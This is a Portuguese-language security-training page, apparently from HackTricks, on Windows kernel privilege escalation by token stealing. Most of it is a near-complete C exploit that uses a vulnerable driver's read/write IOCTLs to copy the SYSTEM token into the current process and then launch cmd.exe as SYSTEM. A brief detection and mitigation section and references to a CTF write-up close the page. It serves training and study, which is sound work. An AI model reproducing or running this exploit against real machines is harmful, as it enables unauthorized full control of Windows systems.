# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Se um driver vulnerável expõe um IOCTL que fornece a um atacante primitivas arbitrárias de leitura e/ou escrita no kernel, a elevação para NT AUTHORITY\SYSTEM geralmente pode ser obtida roubando um access token do SYSTEM. A técnica copia o ponteiro Token de um EPROCESS de um processo SYSTEM para o EPROCESS do processo atual.<sup>[[2]](#references)</sup>

Por que funciona:
- Cada processo tem uma estrutura EPROCESS que contém, entre outros campos, um Token (na verdade, um EX_FAST_REF para um objeto token).
- O processo SYSTEM (PID 4) possui um token com todos os privilégios habilitados.
- Substituir o EPROCESS.Token do processo atual pelo ponteiro do token SYSTEM faz com que o processo atual seja executado como SYSTEM imediatamente.<sup>[[1]](#references)</sup>

> Os offsets em EPROCESS variam entre as versões do Windows. Determine-os dinamicamente (symbols) ou use constantes específicas da versão. Lembre-se também de que EPROCESS.Token é um EX_FAST_REF (os 3 bits inferiores são flags da contagem de referências).

## Etapas de alto nível

1) Localize a base de ntoskrnl.exe e resolva o endereço de PsInitialSystemProcess.
- No user mode, use NtQuerySystemInformation(SystemModuleInformation) ou EnumDeviceDrivers para obter as bases dos drivers carregados.
- Adicione o offset de PsInitialSystemProcess (obtido por symbols/reversing) à kernel base para obter seu endereço.
2) Leia o ponteiro em PsInitialSystemProcess → este é um ponteiro de kernel para o EPROCESS do SYSTEM.
3) No EPROCESS do SYSTEM, leia os offsets de UniqueProcessId e ActiveProcessLinks para percorrer a lista duplamente encadeada de estruturas EPROCESS (ActiveProcessLinks.Flink/Blink) até encontrar o EPROCESS cujo UniqueProcessId seja igual a GetCurrentProcessId(). Mantenha ambos:
- EPROCESS_SYSTEM (para SYSTEM)
- EPROCESS_SELF (para o processo atual)
4) Leia o valor do token do SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Masque os 3 bits inferiores: Token_SYS_masked = Token_SYS & ~0xF (comumente ~0xF ou ~0x7, dependendo do build; no x64, os 3 bits inferiores são usados — máscara 0xFFFFFFFFFFFFFFF8).
5) Opção A (comum): Preserve os 3 bits inferiores do token atual e combine-os com o ponteiro do SYSTEM para manter a contagem de referências incorporada consistente.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Escreva Token_NEW de volta em (EPROCESS_SELF + TokenOffset) usando sua primitiva de kernel write.
7) Seu processo atual agora é SYSTEM. Opcionalmente, inicie um novo cmd.exe ou powershell.exe para confirmar.<sup>[[1]](#references)</sup>

## Pseudocode

Abaixo está um skeleton que usa apenas dois IOCTLs de um driver vulnerável: um para kernel read de 8 bytes e outro para kernel write de 8 bytes. Substitua pela interface do seu driver.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notas:
- Offsets: Use o WinDbg’s `dt nt!_EPROCESS` com os PDBs do alvo, ou um carregador de símbolos em runtime, para obter os offsets corretos. Não os hardcode cegamente.
- Mask: No x64, o token é um EX_FAST_REF; os 3 bits inferiores são bits de contagem de referências. Manter os bits inferiores originais do seu token evita inconsistências imediatas na contagem de referências.
- Stability: Prefira elevar o processo atual; se você elevar um helper de curta duração, poderá perder o SYSTEM quando ele sair.<sup>[[1]](#references)</sup>

## Detecção e mitigação
- O carregamento de drivers de terceiros não assinados ou não confiáveis que expõem IOCTLs poderosos é a causa raiz.
- A Kernel Driver Blocklist (HVCI/CI), o DeviceGuard e as regras de Attack Surface Reduction podem impedir o carregamento de drivers vulneráveis.
- O EDR pode monitorar sequências suspeitas de IOCTL que implementem arbitrary read/write e token swaps.

## Referências

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) e kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (exemplos de token stealing)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
